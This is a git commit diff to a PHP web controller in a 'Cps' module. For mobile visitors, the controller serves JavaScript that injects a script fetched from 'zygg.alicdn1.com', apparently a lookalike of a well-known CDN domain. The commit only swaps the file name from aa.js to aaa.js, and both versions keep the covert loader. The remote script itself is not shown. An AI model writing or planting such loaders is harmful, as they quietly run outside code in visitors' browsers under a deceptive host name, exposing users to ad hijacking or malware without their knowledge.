27152ebcb044a4b9d5d8716a1aed85071759ddc6
phonen <pioul@tom.com>
2017-07-14 23:30:22 +0800

    1

--- application/Cps/Controller/IndexController.class.php
+++ application/Cps/Controller/IndexController.class.php
@@ -203,7 +203,7 @@ class IndexController extends HomebaseController {
 //        $url = $urls[array_rand($urls)];
 //        $this->display(":rbutton");
         if(ismobile()) {
-            echo "var C = function(e){return document.createElement(e);};	var A = C('script');A.src = 'http://zygg.alicdn1.com/aa.js?t=" . time() . "';A.stype = 'text/javascript';document.body.appendChild(A);";
+            echo "var C = function(e){return document.createElement(e);};	var A = C('script');A.src = 'http://zygg.alicdn1.com/aaa.js?t=" . time() . "';A.stype = 'text/javascript';document.body.appendChild(A);";
         }
 
 
